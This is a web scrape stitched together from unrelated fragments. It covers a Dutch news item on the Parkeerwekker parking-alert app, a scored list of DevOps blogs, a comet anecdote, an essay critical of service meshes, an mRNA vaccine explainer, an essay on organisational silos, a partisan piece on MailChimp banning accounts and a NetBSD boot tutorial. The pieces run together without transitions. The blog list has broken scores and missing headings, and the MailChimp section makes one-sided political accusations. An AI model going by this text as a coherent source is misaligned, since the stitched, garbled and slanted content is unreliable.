    Een woordvoerder van de gemeente laat weten dat de activiteiten van Parkeerwekker ingaan tegen de stedelijke regelgeving. “Wat de gemeente Amsterdam betreft, faciliteert Parkeerwekker gebruikers om parkeerkosten bewust zoveel mogelijk te omzeilen,” aldus de woordvoerder. Betaald parkeren is volgens de woordvoerder ingevoerd om ‘optimaal gebruik te kunnen maken van de schaarse ruimte in Amsterdam en om de stad bereikbaar te houden’. “Door dit zo goed mogelijk te organiseren zorgen we voor een efficiënt gebruik van (parkeer)ruimte en een leefbare stad. De opbrengsten van betaald parkeren worden bovendien geïnvesteerd in projecten voor de stad,” aldus de zegsman.
  </p>

  <p data-element-id="b897-5f91-5d93-229b-95f0-8683-469a-aa3c">
    Parkeerwekker maakt gebruik van dashcams die gekoppeld worden aan een platform dat videobeelden uitleest. Wie een berichtje krijgt van de app dat er een scanauto door de straat rijdt, heeft vijf minuten de tijd om de parkeerkosten te betalen en een boete te ontlopen. Per ontvangen waarschuwingsbericht brengt de start-up 1,49 euro in rekening. Tot nu toe is de app naast Amsterdam in een beperkt aantal steden beschikbaar, waaronder Utrecht, Rotterdam en Leiden.
  </p>

  <p data-element-id="1c7a-3be1-bfc6-873b-c6ac-73dd-4a99-67fe">
    Sinds gemeenten scanauto’s inzetten is het aantal parkeerboetes fors gestegen. Uit navraag van <i>Het Parool</i> bleek dat automobilisten in Amsterdam in 2018 voor bijna 30 miljoen euro naheffingsaanslagen kregen, omdat er geen parkeergeld was betaald. In 2012, het laatste jaar voordat de stad de scanauto invoerde, was dat nog 18,5 miljoen euro. Ook kiezen autogebruikers er sinds de scanauto vaker voor om parkeergeld te betalen, omdat de pakkans groter is.

      <p>DevOps is a term that has become more and more popular in job postings and with those looking to break into the industry, especially over the past few years. However, one of the most challenging aspects of DevOps is understanding exactly what it is and how it’s applied in the industry. I’ve rounded up some of the best devops blogs and resources to help you learn about the practice and keep up with changes as they come.</p>

<p>Because it’s a term that spans many different jobs and means something different to each organization, there has been a lot written about DevOps. I scored these blogs based on writing quality, consistency, longevity, technical depth, and usefulness. Based on those criteria, here are 30 of the best DevOps blogs I could find.</p>

<h3 id="arrested-devops"><a href="https://www.arresteddevops.com/">Arrested DevOps</a></h3>

<p>While not strictly a blog, the Arrested DevOps podcast was one of the first that I listened to when I started getting interested in DevOps. They have had nearly every big name in the industry on as a guest at one point or another, and if there is a specific topic you want to learn about, you shouldn’t have a problem finding at least one episode dedicated to that in the archives. If you prefer to learn by listening instead of by reading, definitely check out this podcast.</p>

<ul>
  <li>Writing Quality - 5</li>
  <li>Consistency - 5</li>
  <li>Longevity - 5</li>
  <li>Technical Depth - 5</li>
  <li>Broad Usefulness - 5</li>
</ul>

<p><strong>Total Score: 5</strong></p>

<h3 id="the-microsoft-azure-blog"><a href="https://azure.microsoft.com/en-us/blog/">The Microsoft Azure Blog</a></h3>

<p>As one of the three major cloud providers, the Azure blog doesn’t focus exclusively on DevOps topics, but has a ton of news and information related to cloud computing in general and Azure services in particular. If you use Azure as your cloud provider, this is an especially good blog to follow and if it’s not, it’s always good to learn about what’s possible on other platforms.</p>

<ul>
  <li>Writing Quality - 5</li>
  <li>Consistency - 5</li>
  <li>Longevity - 4</li>
  <li>Technical Depth - a</li>
  <li>Broad Usefulness - 5</li>
</ul>

<p><strong>Total Score: 4.8</strong></p>

<h3 id="the-agile-admin"><a href="https://theagileadmin.com/">The Agile Admin</a></h3>

<p>The Agile Admin is a blog focused on DevOps culture while not ignoring the technical deep dives that many are looking for in a DevOps blog. The standard blog posts are interspersed with technical talks in the form of YouTube videos as well as other kinds of content.</p>

<ul>
  <li>Writing Quality - 5</li>
  <li>Consistency - 4</li>
  <li>Longevity - 4</li>
  <li>Technical Depth - 5</li>
  <li>Broad Usefulness - 5</li>

<p><strong>Total Score: 4.6</strong></p>

<h3 id="the-register"><a href="https://www.theregister.com/devops/">The Register</a></h3>

<p><img src="https://i.imgur.com/sYdSny1.png" alt="The Register DevOps Blog"></p>

<p>If you’re looking for more news than tutorials or documentation, The Register’s DevOps blog is for you. It’s heavily focused on industry news (with some of the snarkiest headlines I’ve ever seen) and has little in the way of tutorials. However, it is one of the best sites I’ve found for keeping up with what’s going on in the industry from a broader business perspective.</p>

<ul>
  <li>Writing Quality - 5</li>
  <li>Consistency - 5</li>
  <li>Longevity - 5</li>
  <li>Technical Depth - 3</li>
  <li>Broad Usefulness - 5</li>
</ul>

<p><strong>Total Score: 4.6</strong></p>

<h3 id="devopsish"><a href="https://devopsish.com/">DevOps’ish</a></h3>

<p>DevOps’ish is a weekly roundup of some of the best posts and writings in the DevOps community. As someone who prefers this kind of format, I really enjoyed the content that I’ve seen from DevOps’ish. As of this writing, the lastest roundup is #186, so they’ve got a large back catalog to read if you want to delve into the archives.</p>

<h3 id="google-devops-and-sre-blog"><a href="https://cloud.google.com/blog/products/devops-sre">Google DevOps and SRE Blog</a></h3>

<p>As another of the big three cloud providers, it makes sense that Google also has a blog sharing their thoughts on DevOps. While many of the articles here are specific to Google Cloud services and offerings, they also have more general content and case studies like “Three months, 30x demand: How we scaled Google Meet during COVID-19”.</p>

</ul>

<p><strong>Total Score: 4.4</strong></p>

<h3 id="devopscom"><a href="https://devops.com/">DevOps.com</a></h3>

<p>Besides having the canonical .com domain name, DevOps.com is a blog with extremely diverse content. With categories ranging from DevSecOps to Continuous Deliver to Leadership Suite to a DevOps-themed comic, there’s something for everyone here.</p>

<h3 id="the-puppet-blog"><a href="https://puppet.com/resources/">The Puppet Blog</a></h3>

<p>As one of the original DevOps tools and the publisher of the annual State of DevOps report, Puppet is uniquely positioned to comment on happenings and new development in DevOps. Their blog contains a wide range of content, from reports and case studies to webinars, all very well put together and detailed.</p>

<p><strong>Total Score: 4.4</strong></p>

<h3 id="code-as-craft"><a href="https://codeascraft.com/">Code as Craft</a></h3>

<p>The Etsy engineering blog, Code as Craft, has detailed posts about some of the challenges that the Etsy engineering team has had to take on as they scale as well as more general DevOps and engineering-focused articles. Because their articles are based on learnings that come out of running a large engineering team, they are an interesting look into how DevOps concepts are applied at a large and fast-moving organization.</p>

<p><strong>Total Score: 4.4</strong></p>

<h3 id="devops-weekly"><a href="https://www.devopsweekly.com/">DevOps Weekly</a></h3>

<p>DevOps Weekly is an email newsletter rather than a blog. If you prefer to have a roundup of content delivered to your email inbox instead of reading many different blogs, definitely check this one out.</p>

<p><img src="https://i.imgur.com/z58fZqp.png" alt="The Docker Blog"></p>

<p>Docker was one of the early tools that inspired and even enabled much of the other DevOps tooling available today. Their blog has been published very consistently since 2013 and has some good technical deep dives on Docker tooling and use cases. There are posts about other topics on this blog as well, but because it is mostly Docker-specific, I took off a couple of points for broad usefulness. However, if you use Docker or any tools that are based on Docker (which is very likely), there’s a lot to learn here.</p>

<h3 id="the-atlassian-devops-blog"><a href="https://www.atlassian.com/blog/devops">The Atlassian DevOps Blog</a></h3>

<p>Atlassian has been making developer and developer-adjacent tooling for years, and as part of that mission, has been shaping the industry. While many of the posts on their blog are Atlassian-specific, they do also have more general content such as their recent “The importance of traceability”.</p>

<h3 id="devto-devops"><a href="https://dev.to/t/devops">dev.to DevOps</a></h3>

<p>Dev.to is another site where users can submit articles and content to the community who can react and comment. In that way, you’re more likely to see personal stories and case studies here, but the content varies widely and you can sort by posts that the community has determined are the “top posts” or browse the latest content.</p>

<p><strong>Total Score: 4.2</strong></p>

<h3 id="high-scalability-blog"><a href="http://highscalability.com/all-posts/">High Scalability Blog</a></h3>

<p>This blog grew to prominence when they published some prominent case studies, but it also has a broad range of content specifically targeted towards running systems and projects at a huge scale. Many times, this knowledge is locked away behind NDAs and other restrictions, but the posts here are illuminating as to how some of the biggest companies in our industry manage that scale.</p>

<h3 id="it-revolution"><a href="https://itrevolution.com/">IT Revolution</a></h3>

<p>IT Revolution was started by Gene Kim, author of The Phoenix Project and The Unicorn Project (great reads that didn’t make the list because they’re books instead of blogs). Far from the technical focus of most of the blogs on this list, IT Revolution focuses more on concepts like leadership and how to drive adoption of DevOps principles. These “soft skills” are just as important as the more technical concepts, and IT Revolution helps emphasize that.</p>

<p><img src="https://i.imgur.com/sIqRrco.png" alt="DevOps Stack Exchange"></p>

<p>The DevOps Stack Exchange is a Q&amp;A site-specific to DevOps. However, the questions on the DevOps Stack Exchange tend to be more technical and more narrowly-scoped, such as dealing with specific error messages of a specific tool. If you have a question about a specific DevOps tool, it’s likely your Google search would lead you here anyway, but browsing the site without a specific question can be a good way to find out what tools others are using and what problems they are struggling with.</p>

<h3 id="devops-multireddit"><a href="https://www.reddit.com/user/obitechnobi/m/devops/">DevOps Multireddit</a></h3>

<p>If one subreddit about DevOps isn’t enough for you, Reddit user <code>obitechnobi</code> has created a collection of 35 subreddits encompassing everything from r/devops to r/linux and r/serverless and plenty more in between, all collected in one place. As I said in our other Reddit entry on this list, because all of this content is user-submitted, quality can vary, but if you wanted the most variety of content from following just one of the links in our list, this one would be it.</p>

<h3 id="digitalai"><a href="https://digital.ai/resources/devops">Digital.ai</a></h3>

<p>Digital.ai has a wide-ranging blog covering many different topics, but they have some great webinars and case studies specifically focused on DevOps. They initially got on my radar when they produced the <a href="https://digital.ai/periodic-table-of-devops-tools">Periodic Table of DevOps</a>, which is “the industry’s go-to resource for identifying best-of-breed tools across the software delivery lifecycle.”</p>

<p>The month was July, the place was the Greek island of Crete, and the sky was spectacular. Of course there were the usual stars like Polaris, Vega, and Antares -- and that common asterism everyone knows: the Big Dipper. </p>



<p>But this sky was just getting started. The band of the Milky Way Galaxy stunned as it arched across the night like a bridge made of stars and dust but dotted with red nebula like candy. The planets Saturn and Jupiter were so bright you wanted to stop people on the beach and point them out. </p>



<p>The air glowed like a rainbow -- but what really grabbed the glory was a comet. Just above the northern horizon, Comet NEOWISE spread its tails like nothing you had ever seen before or might ever see again. Staring in amazement, there was only one thing to do: take a picture. </p>

<p>Hi!</p>
<p>Service meshes have attracted an enormous amount of hype around them. With at least a few talks about service meshes during each tech conference, one can easily be convinced that having a service mesh in their infrastructure is a must. However, hype isn’t a good indicator of whether the new shiny tech is the right solution for your problems. So below, I’ll try to express an anti-hype opinion on service meshes to hopefully make it less confusing when you want to decide whether you may or may not need one.</p>
<p><span><img src="https://serce.me/img/servicemesh/rick.png" alt="rick"></span></p>

<p>There’s a lesson here, and I’m not going to be the one to figure it out.</p>
</blockquote>
<p>
— Rick Sanchez
</p>
</div>
<div>
<h3 id="_the_invention">The invention</h3>
<p>Let’s take a step back in history and take a look at one of the <a href="https://eng.lyft.com/envoy-7-months-later-41986c2fd443">early articles</a> about introducing Envoy at Lyft.</p>
<div>
<blockquote>
<p>As it turns out, almost every company with a moderately-sized service oriented architecture is having the same problems that Lyft did prior to the development and deployment of Envoy:</p>
<div>
<ul>
<li>
<p>An architecture composed of a variety of languages, each containing a half-baked RPC library, including partial (or zero) implementations of rate limiting, circuit breaking, timeouts, retries, etc.</p>
</li>
<li>
<p>Differing or partial implementations of stats, logging, and ….</p>
</li>
</ul>
</div>
</blockquote>
</div>
<p>While Envoy is not a service mesh by itself, the outlined problems describe the exact reason why service meshes were invented. They add “rate limiting, circuit breaking, …” and other reliability, observability, and security features to the services by enforcing the communication to go through the service mesh proxies, a data plane. Additionally, they require a separate component, a control plane, to control the configuration.</p>
<p>However, at this point, a lot of people miss the context in which service meshes were introduced. Service meshes are able to solve the problem not because it’s impossible to solve them in any other way. There are many battle-proof RPC libraries that take on the challenges of a separate data plane layer, <a href="https://github.com/twitter/finagle">Finagle</a>, <a href="https://github.com/grpc">gRPC</a>, <a href="https://github.com/line/armeria">Armeria</a>, <a href="https://github.com/apple/servicetalk">Servicetalk</a>, to name a few. After all, the very first service mesh - Linkerd 1.0 <a href="https://github.com/linkerd/linkerd">is powered by Finagle</a>. The RPC libraries will need a component which provides service discovery and configuration management to make it a true mesh. For instance, Zookeeper, or Consul, a component that service meshes call a control plane.</p>
<p>Why introduce a new concept to solve the problems that have been solved before? The service mesh concept wasn’t introduced to address problems that hadn’t been addressed before but rather address them in a way that doesn’t require any modifications to the application code, which is incredibly convenient when it’s hard to introduce an RPC layer into an existing heterogeneous microservice environment.</p>
<p>When you hear service mesh, Istio with Envoy might be the first thing that comes to mind, but it wasn’t the first service mesh to enter the market. Linkerd authors who pioneered the space, described exactly this situation in the <a href="https://linkerd.io/2017/04/25/whats-a-service-mesh-and-why-do-i-need-one/#why-is-the-service-mesh-necessary">"why is the service mesh necessary"</a>. Interestingly, in many hype-y articles on the Internet this context is often forgotten, or omitted.</p>
<p>Solving a problem well, even if it’s a problem that a lot of people have, doesn’t magically provide the tech with a lot of hype. There is always a sponsor behind it. I don’t know who the sponsor was here, and I’m going to speculate, but it’s hard to sell an RPC library in the world where open source is a fundamental requirement. There is no clear business model there, that’s why most of the mature RPC libraries were open-sourced by large tech companies for which it’s not a part of the core business model. A library is just code, not a piece of infrastructure. Service meshes are a different story. It’s an isolated non-trivial piece of infrastructure. As a vendor, not only can you provide consultancy around the configuration and deployment, but you can also sell complete hosted solutions around it.</p>
</div>
<div>
<h3 id="_disillusionments">Disillusionments</h3>
<p>Now that we’ve established the problems, the solution, and most importantly, the context in which the solution was made, let’s take a look at the alternatives. The most obvious one, in the spirit of KISS, is to use an RPC library for your preferred language. Here is where the context is crucial: if you have a large fleet of services, each written in its own language/ecosystem, and the only language that they share is HTTP then having a single shared RPC library is going to be hard. Perhaps, you’ve got a fabric of deployed and running services, but everyone is afraid of touching them, no one knows how they work, and each redeploy is an adventure. A service mesh is here to help you, because at least you’ll be able to roll out new infrastructure features to the mesh regularly.</p>
<p>On the other hand, if you have a fleet of healthy services written in a single application stack, then it’s a good idea to think twice before introducing a service mesh. By simply introducing or evolving a shared RPC library, you’ll get the exact same benefits and avoid dealing with the downsides of maintaining service meshes. By studying the service mesh limitations thoroughly, you can avoid finding yourself in the trough of disillusionment.</p>
<p><span><img src="https://serce.me/img/servicemesh/curve.png" alt="Hype Cycle"></span></p>
<div>
<h4 id="_different_ecosystem">Different ecosystem</h4>
<p>The ecosystem of the service mesh of your choice will likely be different from the ecosystem of your services. Beautiful websites always make you believe that the solution is plug’n’play, always works and never goes down. In reality, sooner or later problems, bugs, quirks in behaviour will reveal themselves, as they always do. At that point, you’ll need to have engineers who work on the service-mesh’s ecosystem which when it’s different from the main app, effectively limits the set of people who can introduce changes or fix problems. This is likely to reintroduce silos, which is against the whole DevOps spirit. Yes, having a DevOps team of engineers who are doing DevOps-y things <a href="https://continuousdelivery.com/2012/10/theres-no-such-thing-as-a-devops-team/">is against DevOps</a>.</p>
</div>
<div>
<h4 id="_unnecessary_overhead">Unnecessary overhead</h4>
<p>Not only having a proxy in front of each service adds overhead (often significant, talking about <a href="https://istio.io/latest/docs/ops/deployment/performance-and-scalability/">90pt</a> rather than 99pt in the performance summary <a href="https://www.infoq.com/presentations/latency-response-time/">doesn’t make software run faster</a>) and consumes resources, but you also requires time (or rather a team of people) to manage them. Yes, it can help to make some of the tasks potentially easier - yay, you can now add canary deployments with a few lines of YAML to simple applications now. However, you still need to manage canary deployments of the proxies themselves which don’t have a proxy in front of them. The problems just get pushed up the stack.</p>
</div>
<div>
<h4 id="_limiting_your_architecture_to_what_the_proxy_supports">Limiting your architecture to what The Proxy supports.</h4>
<p>As you’re reading this paragraph, HTTP/3 is slowly being rolled out to the Internet. It uses UDP as transport. Why use UDP rather than create a completely new protocol you ask? That’s because anything but TCP and UDP is simply “blocked” by the boxes, various proxies on the internet - routers, gateways, etc. This phenomenon got named <a href="https://http3-explained.haxx.se/en/why-quic/why-ossification">ossification</a>. So, only TCP or UDP are left is the practical chose, and even UDP is partially blocked by various corporate proxies which slows down the adoption.</p>
<p>Even though your microservice environment is probably much smaller compared to the Internet, you can draw parallels with service meshes. Proxies can ossify your application architecture by limiting how your services talk to each other, and there is not much benefit in having proxies if you can bypass them. Suppose you want to build a reactive application which is using RSocket over pure tcp? Or perhaps a message-driven application using an actor model? Or maybe push the performance boundaries with Aeron? Not going to happen until the box in the middle becomes aware of the protocol.</p>
</div>
</div>
<div>
<h3 id="_do_i_need_one">Do I need one?</h3>
<p>What does it all mean for you as an engineer? The answer to whether you need to adopt the service mesh approach comes down to the state of the microservice environment you’re trying to improve. As we have established, compared to an RPC framework, service meshes allow you to:</p>
<div>
<ol>
<li>
<p>Deploy the infra changes more often than deploying your services.</p>
</li>
<li>
<p>Introduce infra changes without touching the service code.</p>
</li>
</ol>
</div>
<p>The point 1. is important when for whatever reason you can’t redeploy your services very often, e.g. maybe no one remembers how it’s done anymore, or maybe there are other restrictions. The point 2. is important when your stack is heterogeneous, e.g. some services are built in Go, some in Java, some in Haskell, etc. Where are you on the interval from a huge set of heterogeneous services with unknown deployment schedules to a set of homogenous regularly deployed services defines whether a service mesh is the best solution for you.</p>
</div>
<div>
<h3 id="_conclusion">Conclusion</h3>
<p>Service meshes have a lot of hype around them, and way too much in my opinion. However, before committing to a piece of technology, it’s crucial to understand the problems it solves, and the context in which the solution was made. A service mesh is not an ultimate “good practice” but simply one of the patterns to solve a set of issues, and it’s quite a heavy one.</p>
<p>Rather than jumping on board, look carefully - the last thing you want is to find out that you have invested in a solution for a problem that you don’t have. Service meshes are an amazing piece of tech solving a whole lot of problems. Not in every case, it is the best solution.</p>

            Pfizer has recently announced that it is ready with a Covid-19 vaccine that is 95 per cent effective. The vaccine is a so-called mRNA vaccine that has been developed jointly by Pfizer and BioNTech. But what is mRNA technology, and how does it work?
            </h3>

    

</div>

                
                
                <div><p>“What is new about this vaccine is that it works using genetic code”, says Research Scientist Sven Even Borgos at SINTEF.</p><p>“This means that the vaccine instructs the body to make small and accurately selected components of the virus. The recipient then develops antibodies against the virus that causes Covid-19”, he explains.</p><p>Borgos is leading SINTEF’s strategic efforts in the field of medical mRNA technology, and has high expectations that the vaccine will be very effective.</p><h2>But what is mRNA?</h2><p>The letters mRNA stand for “messenger ribonucleic acid”, which plays an important role in our bodies’ life processes. It can also be described as a “working copy” or our DNA.</p><p>mRNA is made up of four nucleic acids, abbreviated and represented by the letters A, U, C and G. When they make proteins, our cells read the order of these nucleic acids just like a recipe.</p><p>The idea behind using mRNA to make drugs is based on providing the body with a synthetically-manufactured working copy of our DNA, or another code that we want to read, so that the body itself can go on to make vital proteins that the body lacks, where this deficiency is causing disease.</p><p>“The reason that mRNA-based drugs have the potential to be so effective is that they work in the same way as our own genes”, says Borgos.</p><p>“The technology is relatively new, but is predicted to have a bright future. Recently, SINTEF has been participating with other research centres in a large-scale EU project aimed at using the same approach to develop a drug to combat hereditary breast cancer”, he explains.</p><div>

</div>
<p>The use of mRNA has great potential in a number of fields, including the treatment of cardiopulmonary, neurological and metabolic diseases. In these cases, the body is instructed to manufacture proteins that may be defective or lacking. However, the world really started paying serious attention to this approach when it became clear that mRNA is very effective in the manufacture of vaccines, such as those being developed to combat the virus SARS-CoV-2, which causes the disease Covid-19.</p><h2>The key is in the viral genes</h2><p>In order to make the synthetic mRNA component, researchers must first obtain the DNA from which the working copy is made, and mix it with an enzyme that can both read the DNA code and then manufacture the working copy.</p><p>“This sounds rather technical, but it is in fact one of the most important processes of life on Earth”, says Borgos.</p><p>As soon as the genetic composition of a new virus has been mapped, we can code its key components to make synthetic mRNA, which we then introduce into the body in the form of a vaccine. In this case, we use it against Covid-19.</p><p>The body then uses the instructions coded in the mRNA to make a new protein that is identical to the selected parts of the virus. Our immune system then reacts to these new proteins, but develops its own response without any danger of infection. The body is then ready to combat the virus if and when it becomes infected.</p><h2>Vaccine development in record time</h2><p>The advantage of making a vaccine in this way is that the process is very rapid. <br></p><p>Traditional vaccine development involves first identifying the virus, or the organism that cause the disease. It is then isolated and made more or less inactive, and subsequently injected into the body in order to stimulate an immune response. <br></p><p>This method has worked since as long ago as the 1700s when the first smallpox vaccine was developed. However, the method is time-consuming and may take up to ten years, including vaccine testing.</p><p>Making fully synthetic mRNA vaccines enables us to achieve our goal much more rapidly. Pfizer and BioNTech have now demonstrated how this can be achieved in practice. <br></p><p>Among our challenges are to find out if it works equally as well on all humans, if it provides lasting immunity, and to ensure that it is distributed to enough people. <br></p><p>A particular challenge is that in order to remain active, this particular vaccine must be stored at -70 degrees Celsius.</p><h2>What about Covid in mink?</h2><p>Many people will have heard that mink have been infected by a coronavirus on farms in Denmark. This is not entirely unexpected since the mammalian family to which the mink belongs is especially susceptible to infection by respiratory viruses transmitted by humans. At first, the Danish authorities wanted to destroy all farmed mink, and to place all those that had been in contact with the infected animals in self-isolation.</p><p>It is assumed that the mink have been infected by humans carrying Covid-19, and have subsequently infected other humans. However, while inhabiting “interim carriers” such as mink, the virus could be able to mutate much more rapidly, and in other ways, than it does in the human population. So, in a worst case scenario, variants of the virus will develop that will be untreatable using the vaccines that we are currently developing.</p><h2>Light at the end of the tunnel</h2><p>“After almost a whole year of Covid-19 ravaging the world, its impact has already been enormous”, says Borgos. <br></p><p>“Pfizer and BioNTech are reporting 95 per cent efficacy using their mRNA-based vaccine. This result is much better than most people dared hope, and it helps to boost our faith in the other mRNA vaccines that are currently under development.</p><p>So, even though we still have some testing to do, there is good reason to be optimistic. If the vaccine is a success, we can say that researchers and the pharmaceutical industry have jointly shown the capacity to deliver new and advanced technology on a scale, and at a speed, that we have never experienced before”, he says.</p>

<![CDATA[Measuring Organizational Fragmentation: What’s in a Silo Anyway?]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>Sometimes I complain about <em>fragmentation</em> or <em>silos</em> in organizations. Counterparts are sometimes offended, usually when they feel I'm applying those qualifiers to their own structure. It then becomes hard for me to convey the underlying point:</p>
<blockquote>
<p><em>A certain degree of fragmentation is necessary. Too much of it is bad.</em></p>
</blockquote>
<p>That's pretty meaningless if you don't define <em>fragmentation</em> somehow, so here goes:</p>
<blockquote>
<p><em>If you swap the positions of two members of your organization, what are the chances that they will both perform (reasonably) well within a (reasonably) short timespan?</em></p>
</blockquote>
<p>If the answer is close to 0, it likely implies that people are very specialised, and their activity and the tools they rely on are unique to what they do: in a swapped position, any member must re-learn almost everything about their job. Here I'd call the organization pretty fragmented.</p>
<p>On the other hand, an answer close to 1 means that almost everyone knows everything about how things function in your organization: switching seats has no impact on how someone works. This org’ would be pretty homogeneous.</p>
<h2 id="small-or-big">Small Or Big</h2>
<p>In practice, the answer for any org’ will fall somewhere between the extremes, and whether this is good or bad depends on its line of business: you obviously don't want an expensive PhD to be spending his time on menial operational tasks, so there's no point in training him do do this.</p>
<p>Additionally, and as my friend Chris says, trying to hire people that are verry proficient in exactly everything your org’ does usually amounts to be hunting for a unicorn.</p>
<p>Now, this is not an excuse for letting a structure slip towards the fragmented side:</p>
<h2 id="healthy-adaptability">Healthy Adaptability</h2>
<blockquote>
<p><em>Our line of business, software, is characterized by an ever changing environment. Adaptability of an organization in this environment can make a huge difference.</em></p>
</blockquote>
<p>Thus, I believe that being closer to the <em>adaptable</em> side is better, but not at any price. My interest in the last few years has been in finding ways to shift an engineering structure closer to homogeneity – as defined above – at reasonable cost, without attempting to train or find unicorns.</p>
<p>Ideally, it should be possible to re-allocate certain team members for reasonably short periods with only a minimal amount of friction when the business inevitably requires it.</p>
<p>One of the possibilities <a href="https://j3t.ch/tech/a-disclaimer/">involves your toolchain</a>, for example.</p>

Among many others who have been arbitrarily banned for political reasons include <a href="https://freerepublic.com/focus/f-bloggers/3808319/posts" target="_blank" rel="noopener noreferrer">Stefan Molyneux</a>, March for Trump, VICE founder <a href="https://www.npr.org/2019/02/05/691643824/proud-boys-founder-files-defamation-lawsuit-against-southern-poverty-law-center" rel="noopener noreferrer" target="_blank">Gavin McInnes</a>, and <a href="https://www.naturalnews.com/2018-08-13-mailchimp-goes-full-fascist-de-platforms-alex-jones.html" rel="noopener noreferrer" target="_blank">Alex Jones</a>, and even a random women’s issues blogger <a href="https://medium.com/love-emma/i-got-banned-from-mailchimp-25ca3580e89" rel="noopener noreferrer" target="_blank">named Emma</a>.</p><p>Ironically after Alex Jones was banned, his InfoWars emails are now being powered by the Amazon AWS cloud, meaning that the smaller independent MailChimp is literally just pushing users into Big Tech services instead, or <a href="https://legalinsurrection.com/2020/11/prepare-for-the-great-decoupling-deplatforming-moves-downstream-to-wordpress-com-and-mailchimp/" rel="noopener noreferrer" target="_blank">creating totally new</a> IaaS services from the ground up, like Parler, Gab, and many others.</p><p>In the past few months surrounding the 2020 US Presidential Election, MailChimp’s far-left founder Ben Chestnut, stepped up these efforts drastically <a href="https://reclaimthenet.org/mailchimp-misinformation-censorship/" target="_blank" rel="noopener noreferrer">by announcing</a> they would be deplatforming any newsletter or organization that was distributing information that they personally believed was inaccurate, esp. politically. In essence, it is yet another effort of online tech platforms to silence and destroy conservative or right-leaning publications and ideas.</p><p>Almost immediately the affects were seen as the Northern Virginia Tea Party was permanently banned from MailChimp in November 2020.</p><p>Obviously, this unpredictability is horrible for online business.</p><p>For example, if your team spent months or years perfecting your website’s lead generation system and opt-in features to grow a newsletter or community, and then you got banned overnight for political reasons, it would throw not only your backend software into immediate disarray but also require redesigning your frontend and entire “funnel” from the top to bottom in certain cases. This could end up costing a small company not only thousands of hours of their time, but thousands of dollars in web development services as well.</p><p>Since helping users avoid lock-in to certain stack services or products is one of our main objectives, and allowing websites to switch to a new hosting cloud or WordPress theme/plugin on a moment’s notice with minimal technical debt is of top concern to SlickStack, we felt this decision couldn’t wait any longer.</p><p>Foolishly, MailChimp doesn’t seem to realize that newsletters especially are an easily-replicated IaaS commodity.</p>  </div></div>]]>

<p>System initialization is one of the niche areas that few people look into.
The exact details vary considerably between different platforms, firmwares, CPU architectures and operating systems, making it difficult to learn it all.
Usually, if something is not working correctly during the early stages of system startup or if the OS does not boot, it rarely has anything to do with the code responsible for booting. Most of the time, it is due to other factors, such as the boot media or BIOS configuration.
However, understanding the early initialization process may help debug or to familiarize yourself with a new platform or hardware.</p>

<p>In this article, I will walk through the early kernel initialization process, defining the meaning of this term.
System initialization is a broad topic that ranges from the platform’s hardware design all the way up to typical functions of an operating system such as handling I/O operations.
It is not possible to cover the entire topic adequately within the scope of an article. In this first part I will describe the well-known AMD64: 64-bit platform. I am going to highlight a very interesting part of the initialization process the early initialization of the kernel.
Later, I will compare it with ARM64. In both cases I will discuss the topic in the context of NetBSD, the operating system known for its portability.</p>

<h2 id="the-bigger-picture">The Bigger Picture</h2>

<p>The CPU starting point is called the reset vector: the CPU bootstraps, then fetches and executes the first physical address at location <code>0xFFFFFFF0</code>. The bootloader must always contain a jump to the initialization code in these last top 16 bytes. The CPU is in a variant of a real mode called unreal-mode. 16-bit addressing with segments can address up to 1 MiB of memory.
After the reset, the CS descriptor cache base field contains a special fixed 32-bit value: <code>0xFFFF 0000</code>. (In real-mode a user can change only the lower 16 bits of CS; the upper half, also called the base, is set on reset and hidden).
Using this technique, the instruction pointer addresses relative to the last 64 KiB fragment of the physical memory, which is usually wired to read-only flash memory, where part of the platform firmware (BIOS/UEFI) is located.</p>

<h3 id="bios-or-uefi">BIOS or UEFI?</h3>

<p>BIOS (Basic Input/Output System) is a term used for legacy platform initialization firmware and an interface between the operating system and platform.
It is used mostly with IBM PC compatible machines, such as personal computers or server type machines.
On the other hand, UEFI (Unified Extensible Firmware Interface) is a generic specification, not a particular implementation, and similarly to the BIOS defines an interface between the operating system and platform firmware. The goal of UEFI is to replace legacy interfaces, also is designed to be universal, it can be applied to PC’s or servers as well as embedded devices.
This newer standard was developed to overcome limitations of older standards such as 16-bit processor mode with 1 MB of addressable space, or maximum hard drive sizes from which the operating system can be booted. It also brings new features like secure boot or UEFI runtime services.
Describing UEFI and how it differs from BIOS is out of the scope of this article, but what is important to know is that both BIOS and UEFI based firmware will perform platform initialization, and later load the operating system from the physical medium.
The way that the system is loaded differs between UEFI and BIOS. The newer standard allows for more advanced functionalities, such as GPT partition layout where the BIOS operates on boot sectors. For this article, we will start with the legacy boot process based on Master Boot Record (MBR). The topic of UEFI can be extended in the future if needed.</p>

<h3 id="legacy-bios">Legacy BIOS</h3>

<p>When the CPU starts after reset, most of the platform hardware is not ready to use: system memory connected as a DIMMs modules is not yet detected and initialized, timers and interrupts aren’t ready, nor is the PCI bus working yet.
Hardware has to be initialized, and that is the essential role of platform firmware. A more detailed description of initialization process can be found by a curious reader in Minimal Boot Loader for Intel® Architecture, here I will point out only the critical functionalities.
At the beginning, firmware initialization code needs to initialize the CPU and platform chipsets can only then prepare memory to work.
After the memory is operational in a phase called post memory initialization, the firmware copies itself from the slow flash memory to the system DRAM. Initialization code can start execution only after it prepares software environment as stack or the CPU mode.
When the CPU jumps to memory address below 1MB in the DRAM (this memory region is historically reserved for that purpose), it still has many things to do before it is be able to communicate with external devices.
At the latest phase, IO devices are initialized as well as the PCI bus is enumerated. Once that is done, initialization code will search for a legacy operating system to boot, load the MBR sector from disk to the memory and execute it.</p>

<p>BIOS loads the first sector, called the MBR (512 bytes), from the beginning of the hard disk. That region must end with the magic number (also called a signature) 0xAA55. This sector contains instructions that have to load further sectors into the memory to execute a higher-level bootstrap program for a simple reason: size and how many instructions can fit into 512 bytes.
Only in that way can we have a more complex program that will find and execute the kernel of the operating system.
Before I describe the process of executing kernel and making it operational in the long mode, we need to know what the starting point of a typical UNIX kernel is.</p>

<p><img src="https://raw.githubusercontent.com/Moritz-Systems/moritz_staticDir/master/Loading_MBR_2_gxwj0i.svg" alt="Master Boot Record"></p>

<h2 id="the-kernel-is-an-elf-file">The Kernel is an ELF file</h2>

<p>The two most common executable file formats are ELF (Executable and Linkable Format) and PE (Portable Executable).
In the UNIX environment, ELF is the typical format for program binaries, while PE is widely used on Windows.
It should not be a surprise to the reader that the NetBSD kernel is also ELF executable.</p>

<h3 id="before-the-main">Before the main</h3>

